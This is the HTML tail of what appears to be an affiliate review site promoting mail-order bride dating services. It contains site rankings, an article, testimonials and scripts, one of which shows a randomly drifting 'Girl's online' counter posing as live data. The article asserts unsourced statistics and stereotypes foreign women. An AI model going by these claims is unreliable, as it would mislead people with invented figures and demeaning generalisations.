            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">73%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="1620"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/idate-asia/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>

    <div class="top_rating_item clearfixCust" itemscope itemtype="http://schema.org/Product">
        <div class="product_image_col">

            <div class="image_article">
                <a href="/russian-cupid/">
                    <img src="/images/1534172895563-russian-cupid_s.jpg" alt="Russian Cupid Reviews" title="Russian Cupid Reviews" id="image_single_article"
                         itemprop="logo">
                </a>
            </div>
            <div class="main_stars">
                <div class="star_rate small_stars" itemprop="aggregateRating" itemscope=""
                     itemtype="http://schema.org/AggregateRating">
                    <div style="display: none" itemprop="reviewCount">1</div>
                    <div style="display: none" itemprop="bestRating">10</div>
                    <div id="total_score" itemprop="ratingValue">7.5 </div>
                    <div class="stars"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star-empty"></span><span class="glyphicon glyphicon-star-empty"></span></div>
                </div>
                <div class="votes small_votes">
                    (1023 votes)
                </div>
            </div>
            <a href="/go/russian-cupid?page=main" target="_blank" class="v_btn hide_on_large" rel="nofollow">
                Visit Site
            </a>


        </div>


        <div class="column_buttons">
            <a href="/go/russian-cupid?page=main" target="_blank" class="v_btn hide_on_mobile" rel="nofollow" style="display: block;">
                Visit Site
            </a>

            <div class="read_review_btn hide_on_mobile"><a href="/russian-cupid/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>


        <div class="column_content">
            <div class="cell_title">12. <span itemprop="name">Russian Cupid</span></div>
            <div class="cell_content"><ul>
                    <li>The site can show off with more than 1.5 million registered members</li>
                    <li>Every month <strong>Russian Cupid</strong> is visited by 20,000 international users</li>
                    <li>A few hundred of ladies continually available for online interaction</li>
                    <li>The nearly 20-years experienced team offers high-level customer service</li>
                </ul>
            </div>
            <div class="rates row" style="margin-left: 0;">
                <div class="green_number">71%
                    <div class="number_text"> Girl's reply rate</div>
                </div>
                <div class="green_number green_2"><span class="counter" data-from="0"
                                                        data-to="1124"></span>
                    <div class="number_text"> Girl's online</div>
                </div>
            </div>
            <div class="read_review_btn hide_on_large"><a href="/russian-cupid/" target="_blank" class="read_full">Read
                    review</a></div>
        </div>
    </div>
    <div class="line clearfixCust" id="line_article"></div>

</div>
<div class="content_main clearfixCust" id="main_page_text">
    <div class="content_entry">
        <ul class="table_of_content">
            <li>
                <a href="#find-beautiful-woman-for-marriage" data-target="find-beautiful-woman-for-marriage" class="go_to"> Mail Order Bride - Find Beautiful Woman for Marriage </a>
            </li>
            <li>
                <a href="#who-exactly-is-a-mail-order-bride" data-target="who-exactly-is-a-mail-order-bride" class="go_to"> Who exactly is a mail-order bride? </a>
            </li>
            <li>
                <a href="#how-does-a-mail-order-bride-site-work" data-target="how-does-a-mail-order-bride-site-work" class="go_to"> How does a mail-order bride site work? </a>
            </li>
            <li>
                <a href="#is-it-safe-to-date-a-mail-order-bride" data-target="is-it-safe-to-date-a-mail-order-bride" class="go_to"> Is it safe to date a mail-order bride? </a>
            </li>
            <li>
                <a href="#the-real-truth-about-mail-order-brides" data-target="the-real-truth-about-mail-order-brides" class="go_to"> The real truth about mail order brides </a>
            </li>
            <li>
                <a href="#how-much-are-mail-order-brides" data-target="how-much-are-mail-order-brides" class="go_to"> How Much Are Mail Order Brides? </a>
            </li>
            <li>
                <a href="#customer_reviews" data-target="customer_reviews" class="go_to"> Customer Reviews: What Do People Say About Mail Order Bride </a>
            </li>
        </ul>
        <h2 id="find-beautiful-woman-for-marriage">Mail Order Bride - Find Beautiful Woman for Marriage</h2>
        <p>
            <img src="/images/Depositphotos_56697321_l-2015.jpg" alt="wedding_couple" title="wedding_couple" style="width: 100%;"> <br>
        </p>
        <p>People from other countries, cultures, and races are usually more attractive and interesting to date. They’re always curious about people with different cultures, backgrounds, religions, and languages. Others seek for the adventure and pleasure of building intimacy with an attractive, exotic person from another country.</p>
        <p>Both men and women alike enjoy this adventure, and the internet has made it a lot easier. There are millions of men from all walks of life who are seeking beautiful mail order brides for international marriage, and these beautiful brides are eager to meet with foreign men as well.</p>
        <p>Reasons why men seek an international mail-order bride vary. Some are after a romantic relationship with an attractive, exotic woman, and others want a wife who is more cultured with values for families ties than many western women.</p>
    </div>
</div>
<div class="line clearfixCust" style="background-color: #dcdcdc;opacity: 1;">
</div>
<div id="line_before_authors">
</div>
<div class="line clearfixCust" style="background-color: #dcdcdc;opacity: 1;">
</div>
<div class="content_main clearfixCust" style="background-color: #ffffff;">
    <div class="content_entry">
        <h3 id="who-exactly-is-a-mail-order-bride">Who exactly is a mail-order bride?</h3>
        <p>
        </p>
        <p>
            <img src="/images/Depositphotos_109855720_l-2015.jpg" alt="mail-order-brides" title="mail-order-brides" style="width: 100%;"> <br>
        </p>
        <p>A mail-order bride is a woman who puts up her profile on a dating site for marriage proposals from foreign men. Most times, these women are from developing countries while the men who are seeking foreign mail order brides for marriage are located in developed countries. Some of the best countries for mail order brides include China, Japan, Philippine, Ukraine, and Russia.</p>
        <div id="user_place">
        </div>
        <h3 id="how-does-a-mail-order-bride-site-work">How does a mail-order bride site work?</h3>
        <p>There are a lot of mail order bride websites on the internet which makes it even more confusing to decide on which one to use. But the good news is that we’ve prepared a list of good and trusted mail order sites that can give you value for your money.</p>
        <p>After you have signed up on any of our recommended sites, you will need to set up a profile with details including your age, location, and career, etc. Your profile will help your potential brides to get to know you without asking too many boring questions. Once your profile is all set up, you can start searching for the woman of your choice using the search filter and matching systems.</p>
        <p>
            <img src="/images/Depositphotos_61867797_l-2015.jpg" alt="love" title="love" style="width: 100%;"> <br>
        </p>
        <p>
        </p>
        <h3 id="is-it-safe-to-date-a-mail-order-bride">Is it safe to date a mail-order bride?</h3>
        <p>The short answer is YES! When it comes to online dating and relationship, there are few things you must get right, including caution especially in the aspect of money. Don’t just send money to every woman you meet on these dating sites just because they told you one sad story or the other.</p>
        <p>Scammers are everywhere, and some people do create fake profiles on these dating websites just to ask men for money to treat a sick relative. These scammers tell a bunch of sad stories just to trick men. Some men fell for some of these sad stories and end up heartbroken as well as losing their money.</p>
        <p>However, there are many men out there with better experience. And some of them have even confessed that using a mail order bride site to get a wife was the best thing that ever happened to them.</p>
        <div id="quiz_place">
        </div>
        <h3 id="the-real-truth-about-mail-order-brides">The real truth about mail order brides</h3>
        <p>The real truth about mail other brides is that “they work.” You've got a higher chance of having a successful marriage if your wife is a mail-order bride or someone you met online in a foreign country who is willing to leave her homeland to meet with you to start a family. Statistics have shown that cross-cultural relationships and marriages are more successful and last longer than domestic ones.</p>
        <p>Also, most of these women who put up themselves as mail order brides tend to be more cultured, supportive, and family oriented. You hardly find these qualities among women in the wealthiest western countries. Western men are often seeking for a long-term relationship with a mail-order bride who can play a motherly role in the family.</p>
        <p>These beautiful mail order brides seeking for international marriage often appreciate the qualities of western men residing in developed countries including their culture, language, education, etc.</p>
        <p>
            <img src="/images/Depositphotos_141427998_l-2015.jpg" alt="mail-order bride" title="mail-order ride" style="width: 100%;"> <br>
        </p>
        <p>
        </p>
        <h2 id="how-much-are-mail-order-brides">How Much Are Mail Order Brides?</h2>
        <p>Any man who is seeking for an overseas bride through the internet would definitely want to know how much they’d spend on a mail order bride. Well, the costs vary from site to site, and the money you’re paying is a way to guarantee that you will treat the ladies with respect.</p>
        <p>There are usually three types of membership on most sites -The free membership, the paid membership, and then some sites that will ask you to pay for each woman’s contact details that you need. While some sites prefer to charge for a monthly membership, other are yearly.</p>
        <p>Monthly memberships are usually around $30-$40, while yearly memberships are around $150 - $200 with discounts. Some sites may give you special offers. You could also try the free membership, but it comes with limited features, and you would need to upgrade to a paid account at some point.</p>
        <p>The legal paperwork is another factor that will determine the total amount you will spend on mail order brides. Some good sites offering mail order bride services would handle all the paperwork for you and the price usually fall under $500</p>
        <h2 id="customer_reviews">Customer Reviews: What Do People Say About Mail Order Bride</h2>
        <h3>Quora user - Donald Trump (not the US president)</h3>
        <em> <p>"I have met my wife on a Russian mail-order bride, and we are married for two years now. So if you ask me, my results were just great:) A colleague of mine used a different site (can't remember which one) and was not lucky at all."</p> </em>
        <h3>Redittor farkner</h3>
        <em> <p>"I have known a couple of guys. One was an older guy, about 72. Imported a 45-year-old Russian woman. Good for the guy, good for the woman. She then had him bring over her son, her mother, and her dog. The dog was the hardest. They are all still doing well, and this is about 8 years ago."</p> </em>
        <h3>Quora user - Nazeem Dollie</h3>
        <p style="font-style: italic;">"I'm a guy from South Africa that's engaged to a Russian girl from the Russian region of Ural, city of Kungur. I'm 36, and she's 29."</p>
        <p style="">(A few days later he updated his review) <em> </em>
        </p>
        <p style="font-style: italic; display: inline !important;">"I am now living in Russia with my Russian wife and life is great here! Yes, I married a mail order bride, but please get this term out of your head because how it works is as follows: You have to fly to Russia. You still have to meet her in person. She is fully empowered to say yes or no to your proposal. You get to know her like a normal person. If you make a good enough impression, she will decide to marry you."</p>

    </div>
</div>

<div id="rand_quiz">
    <div id="title">
        <h2>Quizzes</h2>
    </div>
    <div class="articles_related_quiz">
        <div class="related_quiz">
            <div class="post_related_quiz">
                <div class="image_wrap_related_quiz">
                    <img src="/images/playbuzz.png" alt="playbuzz" class="quiz" width="70">

                    <img src="/images/who-is-your-ideal-mail-order-bride_1534172573.jpg" alt="mail-order bride of your dreams"
                         title="mail-order bride of your dreams" id="post_image_quiz"></div>
            </div>

            <div class="post_related_quiz clearfixCust">
                <div class="post_header_related_quiz">
                    <div class="post_header_list_related_quiz"><a href="/who-is-your-ideal-mail-order-bride/" class="replace" rel="nofollow" target="_blank">Who is Your Ideal Mail-Order Bride?</a></div>
                </div>
                <div class="post_content_related_quiz">
                    If you didn't have much online dating luck last year, take our quiz to learn more about your ideal mail-order bride and find your partner of a lifetime.







                </div>
                <a href="/who-is-your-ideal-mail-order-bride/" class="post_button_quiz" target="_blank" rel="nofollow">
                    Play now
                </a>
            </div>

        </div>
        <div class="related_quiz">
            <div class="post_related_quiz">
                <div class="image_wrap_related_quiz">
                    <img src="/images/playbuzz.png" alt="playbuzz" class="quiz" width="70">

                    <img src="/images/pick-our-hottest-beauty-queens_1534172505.jpg" alt="Choose the Beauty Queens from Yourbride"
                         title="Choose the Beauty Queens from Yourbride" id="post_image_quiz"></div>
            </div>

            <div class="post_related_quiz clearfixCust">
                <div class="post_header_related_quiz">
                    <div class="post_header_list_related_quiz"><a href="/pick-our-hottest-beauty-queens/" class="replace" rel="nofollow" target="_blank">Pick Our Hottest Beauty Queens</a></div>
                </div>
                <div class="post_content_related_quiz">
                    Can you guess which of these girls are beauty contest winners and which are just regular girls?





                </div>
                <a href="/pick-our-hottest-beauty-queens/" class="post_button_quiz" target="_blank" rel="nofollow">
                    Play now
                </a>
            </div>

        </div>
    </div>
</div>

<div class="row center" id="authors_line" style="background-color: #ffffff; padding-bottom: 30px; margin-left: 0; margin-right: 0;">
    <div class="col s7 authors_main" style="display: block; margin: auto; float: none; padding-top: 30px;">
        <div class="col s3 left each_author_main">
            <div class="col s12 center">
                <div class="image_circle center">
                    <a href="/author/taylor-thompson/"><img src="/images/taylor-thompson_1534172408.jpg" alt="Taylor Thompson"></a>
                </div>
            </div>
            <div class="col s12 center" style="margin-top: 10px;">
                <a href="/author/taylor-thompson/" class="author_main_link">Taylor Thompson</a>
            </div>
            <div class="col s12 center" style="color: #333333;">
                Senior Writer
            </div>
        </div>
        <div class="col s3 left each_author_main">
            <div class="col s12 center">
                <div class="image_circle center">
                    <a href="/author/huan-wudunn/"><img src="/images/huan-wudunn_1534172416.jpg" alt="Huan WuDunn"></a>
                </div>
            </div>
            <div class="col s12 center" style="margin-top: 10px;">
                <a href="/author/huan-wudunn/" class="author_main_link">Huan WuDunn</a>
            </div>
            <div class="col s12 center" style="color: #333333;">
                Сontributing Editor and Relationship Expert
            </div>
        </div>
        <div class="col s3 left each_author_main">
            <div class="col s12 center">
                <div class="image_circle center">
                    <a href="/author/dave-greenberg/"><img src="/images/dave-greenberg_1534172424.jpg" alt="Dave Greenberg"></a>
                </div>
            </div>
            <div class="col s12 center" style="margin-top: 10px;">
                <a href="/author/dave-greenberg/" class="author_main_link">Dave Greenberg</a>
            </div>
            <div class="col s12 center" style="color: #333333;">
                Senior Associate Editor
            </div>
        </div>
    </div>
</div>
<div class="content_main clearfixCust" style="background-color: #ffffff;">

    <div class="related_posts clearfixCust">
        <div class="content_header">
            <h3 style="text-align: center;">Dating Tips for Men Seeking Foreign Brides</h3>
        </div>

        <div class="articles_related">
            <div class="related">
                <div class="post_related">
                    <div class="image_wrap_related">
                        <img src="/images/5-shortcuts-to-start-speaking-russian_s.jpg" alt=""
                             title="" id="post_image"></div>
                </div>

                <div class="post_related clearfixCust">
                    <div class="post_header_related">
                        <div class="post_header_list_related"><a href="/5-shortcuts-to-start-speaking-russian/" rel="bookmark"
                                                                 target="_blank">5 Shortcuts to Start Speaking Russian</a></div>
                    </div>
                    <div class="col s12 author_link">
                        <a href="/author/dave-greenberg/">Dave Greenberg</a>
                    </div>
                    <div class="latest_related">Latest update: 2018-08-10</div>
                    <div class="post_content_related">
                        <div></div>
                        news
                    </div>
                </div>

            </div>
            <div class="related">
                <div class="post_related">
                    <div class="image_wrap_related">
                        <img src="/images/types-of-asian-women-to-find-on-dating-sites_s.jpg" alt="Asian Girls"
                             title="Asian Girls" id="post_image"></div>
                </div>

                <div class="post_related clearfixCust">
                    <div class="post_header_related">
                        <div class="post_header_list_related"><a href="/types-of-asian-women-to-find-on-dating-sites/" rel="bookmark"
                                                                 target="_blank">Types of Asian Women to Find on Dating Sites</a></div>
                    </div>
                    <div class="col s12 author_link">
                        <a href="/author/taylor-thompson/">Taylor Thompson</a>
                    </div>
                    <div class="latest_related">Latest update: 2018-07-25</div>
                    <div class="post_content_related">
                        <div></div>
                        news
                    </div>
                </div>

            </div>
            <div class="related">
                <div class="post_related">
                    <div class="image_wrap_related">
                        <img src="/images/mail-order-brides-and-single-dads_s.jpeg" alt=""
                             title="" id="post_image"></div>
                </div>

                <div class="post_related clearfixCust">
                    <div class="post_header_related">
                        <div class="post_header_list_related"><a href="/mail-order-brides-and-single-dads/" rel="bookmark"
                                                                 target="_blank">Mail-Order Brides and Single Dads. Can It Work?</a></div>
                    </div>
                    <div class="col s12 author_link">
                        <a href="/author/huan-wudunn/">Huan WuDunn</a>
                    </div>
                    <div class="latest_related">Latest update: 2018-07-09</div>
                    <div class="post_content_related">
                        <div></div>
                        news
                    </div>
                </div>

            </div>
        </div>

    </div>


</div>
<div class="line clearfixCust" id="line_article"></div>
<div class="hide_on_mobile" style="width: 100%">
    <form class="subscribe_form_articles" method="post">
        <div class="row" style="margin-left: 0; margin-right: 0;">
            <div class="form_articles col s7" style="display: block; margin: auto; float: none;">

                <div class="col s4 left">

                    <div class="image_form_articles"></div>
                </div>
                <div class="form_content_tablet col s7 left">

                    <div class="sbscr_text sbscr_text_articles col s12 left">

                    </div>

                    <div class="inner_contact_articles col s5 left">
                        <input id="email" type="email" class="input_cont" name="email" placeholder="Email"/>
                    </div>
                    <input type="hidden" class="form_text" name="form_text" value="">
                    <input type="hidden" class="form_position" name="form_position" value="desktop_tablet_footer">

                    <div class="subscribe_tablet col s4 left">
                        <input type="submit" value="Subscribe" class="subscribe subscribe_article">
                    </div>
                    <div class="error"></div>
                </div>
            </div>
        </div>


    </form>
</div>
<form class="hide_on_large" style="background-color: #ffffff;" method="post">
    <div class="row" style="margin-left: 0; margin-right: 0;">
        <div class="subscribe_image col s12 center">
            <div class="image_form"></div>
        </div>
        <div class="sbscr_text center">
        </div>
        <div class="inner_contact center">
            <input id="email" type="email" class="input_cont" name="email" placeholder="Email"/>
        </div>
    </div>
    <input type="hidden" class="form_text" name="form_text" value="">
    <input type="hidden" class="form_position" name="form_position" value="mobile_footer">
    <div class="error"></div>
    <div class="row" style="margin-left: 0; margin-right: 0;">
        <div class="col s12 center">
            <input type="submit" value="Subscribe" class="subscribe">
        </div>
    </div>
</form>
<!--div class="b-p" id="p1" style="display: none;">
    <div class="b-p-content">
        <div class="grad_p">
            <div class="row">
                <div class="col s1 right" style="margin-top: 20px; margin-right: 20px;">
                    <a href="javascript:PHide()"><img src="/images/close-p.png" class="close_form1" width="14"></a>
                </div>
            </div>
            <div>

                <div id="new_to"
                     style="color: #ffffff; line-height: 30px; font-size:30px; font-weight: 600; text-align: center; letter-spacing: 1.5px;">New to
                    YourBride?
                </div>
                <div style="color: #ffffff; margin-bottom: 30px;line-height: 30px; font-size:18px; font-weight: 400; text-align: center; letter-spacing: 0.0px;">
                    Wait! Don’t go empty-handed
                </div>
                <div class="inner_p_mobile" id="timer"
                     style="color: #feec1e; margin-bottom: 20px; font-size: 29px; font-weight: 600; letter-spacing: 1.45px; text-align: center;"></div>
                <div style="color: #ffffff; margin-bottom: 30px;line-height: 30px; font-size:22px; font-weight: 500; text-align: center; letter-spacing: 1.1px;">
                    Get <span style="color: #feec1e;">20 credits</span> for Free
                </div>
                <a href="/go/victoria-brides?page=p" target="_blank" class="p_button" rel="nofollow">
                    Join For Free</a>

            </div>
        </div>
    </div>
</div-->
<div class="content_entry" id="user_com">
    <h3>What People Say About YourBride</h3>
    <div class="row" id="users_slider">
        <div class="arrow left_arrow"></div>
        <div class="arrow right_arrow"></div>
        <div class="col s10 authors_text">

            <div id="u_0">
                <div class="row">
                    <div class="col s3 authors_photo_main authors_mobile_main" style="margin-right: 20px; padding: 0;">
                        <img src="/images/perry.jpg" alt="perry">
                    </div>
                    <div class="col s8 authors_mobile_main">
                        <div class="col s12 authors_name">
                            Perry
                        </div>
                        <div class="col s12">
                            <div id="total_score" style="color: #fba735; font-size: 17px; font-weight: 600;">10.0 </div>
                            <div class="stars" style="font-size: 17px;"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span></div>
                        </div>
                    </div>
                </div>
                <div class="row authors_description">
                    Yourbride gives me the sense of real Slavic beauty and real Slavic soul. I’ve always thought that it’s a stereotype and there is nothing that different and that special about East European girls. I wanted to check it out as I was pretty curious what this buzz was about. So I found the site Victoria Brides here and it was the third site I’ve been using. This site impressed me immediately as it resembles Tinder to some extent. But it’s not the most important. The key aspect which makes Victoria Brides peculiar is that women here seem to be real. I don’t mean that on the other sites they were fake, but here I have a feeling that I’m talking to sincere girls who are truly interested in me. And now I understand why guys are astonished by Slavic girls!                </div>
            </div>
            <div id="u_1">
                <div class="row">
                    <div class="col s3 authors_photo_main authors_mobile_main" style="margin-right: 20px; padding: 0;">
                        <img src="/images/tyler.jpg" alt="tyler">
                    </div>
                    <div class="col s8 authors_mobile_main">
                        <div class="col s12 authors_name">
                            Tyler
                        </div>
                        <div class="col s12">
                            <div id="total_score" style="color: #fba735; font-size: 17px; font-weight: 600;">9.6 </div>
                            <div class="stars" style="font-size: 17px;"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class = "glyphicon glyphicon-star half"></span></div>
                        </div>
                    </div>
                </div>
                <div class="row authors_description">
                    I’m a bit tired of the dating sites as they usually look the same and offer you the same services. It should be fun but, usually, it’s boring. Yourbride was a breath of the fresh air for me! These guys know what they are doing! They offer so many great websites and pretty thorough reviews. I have tried two of them. Matchmaking service is awesome! I love how they managed to integrate technologies similar to Tinder here. But for me, Tinder is not appropriate as I’m almost 50. And here I get similar service but I’m not dealing with 16-year-olds – I’m chatting with mature and adult ladies. Good job, Yourbride!                </div>
            </div>
            <div id="u_2">
                <div class="row">
                    <div class="col s3 authors_photo_main authors_mobile_main" style="margin-right: 20px; padding: 0;">
                        <img src="/images/bill.jpg" alt="bill">
                    </div>
                    <div class="col s8 authors_mobile_main">
                        <div class="col s12 authors_name">
                            Bill
                        </div>
                        <div class="col s12">
                            <div id="total_score" style="color: #fba735; font-size: 17px; font-weight: 600;">9.1 </div>
                            <div class="stars" style="font-size: 17px;"><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class="glyphicon glyphicon-star" style="color: #fba735;"></span><span class = "glyphicon glyphicon-star half"></span></div>
                        </div>
                    </div>
                </div>
                <div class="row authors_description">
                    The selection of women is great! When I come back home from work I don’t even know who I should answer first as I receive a few emails per day. If you are looking for serious and long-term relations you are on the right way! I’m single as of now but I know that the majority of girls have serious intentions and I just need to find a lady who would be into me!            </div>
            </div>
            <div class="col s2" style="text-align: center; margin: auto; float: none">
                <div style="display:-webkit-inline-box;">
                    <div class="point" id="point_u_0"></div>
                    <div class="point" id="point_u_1"></div>
                    <div class="point" id="point_u_2"></div>
                </div>
            </div>
        </div>
    </div>
</div>


<footer class="footer clearfixCust">
    <div class="footer_nav container">

        <div id="footer_block1">
            <div class="footer_block_header">
                About YourBride
            </div>
            <div>
                Yourbride.com is an online review platform that helps men choose the right dating website.
                We provide high quality reviews of over 100 online dating services.
                The rankings are based on the opinions of real customers who wish to share their experience with us.<br><br>
                Advertise with YourBride and reach your audience.
                For advertising inquiries, please contact us at <a href="mailto:twograinsmedialtd@gmail.com">twograinsmedialtd@gmail.com</a><br><br>
                Have a breaking story? Let us know <a href="mailto:twograinsmedialtd@gmail.com">here</a>
            </div>
        </div>
        <div id="footer_block2">
            <div class="footer_block_header">
                Categories
            </div>
            <div>
                <a href="/">Top 10 Sites</a><br>
                <a href="/russian-brides-sites/">Russian Brides Sites</a><br>
                <a href="/ukrainian-brides-sites/">Ukrainian Brides Sites</a><br>
                <a href="/asian-brides-sites/">Asian Brides Sites</a><br>
                <a href="/latin-brides-sites/">Latin Brides Sites</a><br>
                <a href="/success-stories/">Success Stories</a><br>
                <a href="/blog/">Blog</a><br>
                <a href="/quizzes/">Quizzes</a>

            </div>
        </div>
        <div id="footer_block3">
            <div class="footer_block_header">
                Contact & Info
            </div>
            <div>
                <a href="/about/">About YourBride</a><br>
                <a href="/contact/">Contact Us</a><br>
                <a href="/terms/">Terms of Use</a><br>
                <a href="/privacy/">Privacy Policy</a><br>
                <a href="/faq/">FAQ</a><br>
                <a href="/safety-tips/">Safety Tips</a><br>
                <noindex><a href="/report-corrections/" rel="nofollow">Report Corrections</a></noindex>
            </div>
        </div>

    </div>
    <div class="clearfixCust line">

    </div>
    <div id="copyright">
        Copyright © 2015-2018 TwoGrains Media Ltd. All rights reserved. <a href="/">YourBride.com</a> - Top Mail Order
        Bride Dating Sites Reviews
    </div>
</footer>
<div id="toTop"></div>


<script async src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<!--script async src="/js/bootstrap-rating-input.js"></script-->

<script>
    var _0x9949 = ["\x75\x73\x65\x72\x41\x67\x65\x6E\x74", "\x74\x65\x73\x74", "\x68\x6F\x73\x74\x6E\x61\x6D\x65", "\x79\x6F\x75\x72\x62\x72\x69\x64\x65\x2E\x63\x6F\x6D", "\x72\x65\x6D\x6F\x76\x65", "\x62\x6F\x64\x79"];
    $(function () {
        if (/bot|google|baidu|bing|msn|duckduckgo|teoma|slurp|yandex/i[_0x9949[1]](navigator[_0x9949[0]]) && location[_0x9949[2]] != _0x9949[3]) {
            $(_0x9949[5])[_0x9949[4]]()
        }
    });

    $(function () {
        $(".drop").click(function () {
            $(this).children(".dropdown_content").slideToggle(500);
            $(this).toggleClass("expanded");
        });
        let width = window.innerWidth;
        if (width <= 580) {
            $(".cross").hide();
            $(".header_link").hide();
            $(".hamburger").click(function (e) {
                e.preventDefault();
                $('.header').addClass('fixed');
                $(".header_link1").slideToggle("fast", function () {
                    $(".hamburger").hide();
                    $(".cross").show();

                });

            });
            $(".cross").click(function () {
                $(".header_link1").slideToggle("fast", function () {
                    $(".cross").hide();
                    $(".hamburger").show();
                });
            });

        }
        let lastId,
            topMenu = $(".table_of_content"),
            menuItems = topMenu.find("a"),
            scrollItems = menuItems.map(function(){
                let item = $($(this).attr("href"));
                if (item.length) { return item; }
            });
        $(window).scroll(function () {
            if ($(this).scrollTop() != 0) {
                $('#toTop').fadeIn();
            } else {
                $('#toTop').fadeOut();
            }

            var sticky = $('.sticky'),
                scroll = $(window).scrollTop();
            if (scroll > 0) sticky.addClass('fixed');
            else sticky.removeClass('fixed');


            let fromTop = $(this).scrollTop();
            let table_height = $('.table_of_content').outerHeight();
            let border_scroll = $('footer').offset().top;
            let menuHeight = $('.articles_list').offset().top + $('.articles_list').height();
            let bottom_line = border_scroll - table_height;

            if (fromTop > menuHeight - 120 && fromTop < bottom_line - 450) {

                $('.table_of_content').css({
                    position: 'fixed',
                    top: 120
                })
            } else if (fromTop > (bottom_line - menuHeight )) {
                $('.table_of_content').css({
                    position: 'absolute',
                    top: bottom_line - 350
                })
            } else {
                $('.table_of_content').css({
                    position: 'absolute',
                    top: menuHeight + 20
                })
            }
            let cur = scrollItems.map(function () {
                if ($(this).offset().top < fromTop + 170)
                    return this;
            });
            cur = cur[cur.length - 1];
            let id = cur && cur.length ? cur[0].id : "";

            if (lastId !== id) {
                lastId = id;
                menuItems
                    .parent().removeClass("active")
                    .end().filter("[href='#" + id + "']").parent().addClass("active");
            }

            if (width < 800){

                $('.table_of_content').css({
                    position: 'relative',
                    top: 0
                });

            }


        });

        $('#toTop').click(function () {
            $('body,html').animate({scrollTop: 0}, 800);
        });

        $('.go_to').click(function () {
            var scroll_el = $(this).attr('href');
            if ($(scroll_el).length != 0) {
                $('html, body').animate({scrollTop: $(scroll_el).offset().top - 70}, 500);
            }
            return false;
        });
        jQuery('a[href*="track.cpatrue.com"]').each(function () {
            var $this = jQuery(this);
            var link = $this.attr('href').replace('review', 'main');
            $this.attr('href', link);
        });
        jQuery('a[href*="yourbride.com"]').each(function () {
            var $this = jQuery(this);
            var link = $this.attr('href').replace('review', 'main');
            $this.attr('href', link);
        });

        $('.progress .progress-bar').css("width",
            function () {
                return $(this).attr("aria-valuenow") * 10 + "%";
            }
        );
        $(".counter").counting({
            duration: 2000
        });

        function refreshOnline() {
            $('.counter').each(function () {
                let obj = $(this);
                let refreshing = setInterval(function () {
                    let toOld = obj.attr('data-to');
                    let oldFrom = obj.attr('data-from');
                    let newFrom = obj.attr('data-from').replace(oldFrom, toOld);
                    let refreshto = 0;
                    let randomnumber = Math.floor(Math.random() * 50);
                    if (randomnumber % 2 == 0) {
                        refreshto = parseFloat(toOld) + Math.floor(Math.random() * 5);
                    }
                    else {
                        refreshto = parseFloat(toOld) - Math.floor(Math.random() * 5);
                    }

                    let toNew = obj.attr('data-to').replace(toOld, refreshto.toString());
                    obj.attr('data-from', newFrom);
                    obj.attr('data-to', toNew);
                    if (refreshto > 8000) clearInterval(refreshing);
                    obj.counting({
                        duration: 2000,
                        fade: false
                    });
                }, 20000);
            });

        }

        refreshOnline();


    });
    // twttr.widgets.load();



</script>
<script>
    $(function () {
        //PHide();
        $("#authors_line").insertAfter("#line_before_authors");
        $("#user_com").insertAfter("#user_place");
        $("#rand_quiz").insertAfter("#quiz_place");


        var $contentTableLink = $('.contentTable a');
        $contentTableLink.click(function () {
            $('html, body').animate({
                scrollTop: $('#' + $(this).attr('data-target')).offset().top - document.getElementById('topMenu').clientHeight + 'px'
            }, 500);
            return false;
        });


        var subscribe_text = [
            'Learn how to meet the prettiest brides',
            'Learn how to find the right woman for you',
            'Tired of being single? We will help you meet your dream woman'
        ];
        let onetext = subscribe_text[Math.floor(Math.random() * subscribe_text.length)];

        $('.sbscr_text').text(onetext);
        $('.form_text').val(onetext);

        $('.close_form').on('click', function () {
            $('.subscribe_form_articles_div').slideUp();
        });
        $('.mobile_close_form').on('click', function () {
            $('.form_on_mobile').slideUp();
        });
        /*PShow();

        $(document).mouseup(function (e) {
            let container = $(".b-p");
            if (container.has(e.target).length === 0){
                container.hide();
            }
        });*/


    });
    /*function PShow(){
        setTimeout(function(){
            $('#p1').show();
        }, 15000);
    }
    function PHide(){
        $("#p1").hide();
    }

    let countdown = 15 * 60 * 1000;
    let timerId = setInterval(function(){
        countdown -= 1000;
        let min = Math.floor(countdown / (60 * 1000));
        let sec = Math.floor((countdown - (min * 60 * 1000)) / 1000);  //correct

        if (countdown <= 0) {
            clearInterval(timerId);
            document.getElementById("timer").innerHTML = "EXPIRED";
        } else {
            document.getElementById("timer").innerHTML = min + " minutes and " + sec + " seconds";
        }

    }, 1000);*/
    var slide_1 = $('#u_0');
    var point_1 = $('#point_u_0');
    var slide_2 = $('#u_1');
    var point_2 = $('#point_u_1');
    var slide_3 = $('#u_2');
    var point_3 = $('#point_u_2');
    var left_arrow = $('.arrow.left_arrow');
    var right_arrow = $('.arrow.right_arrow');
    var slider_counter = 1;
    slide_1.addClass('slider_active');
    point_1.addClass('point_active');
    slide_2.addClass('slider_inactive');
    point_2.addClass('point_inactive');
    slide_3.addClass('slider_inactive');
    point_3.addClass('point_inactive');


    left_arrow.on('click', function(){
        if(slider_counter == 1){
            slider_counter = 3;
            slide_3.removeClass("slider_inactive");
            point_3.removeClass('point_inactive');
            point_3.addClass('point_active');
            slide_3.addClass("slider_active");
            slide_1.addClass("slider_inactive");
            point_1.addClass('point_inactive');
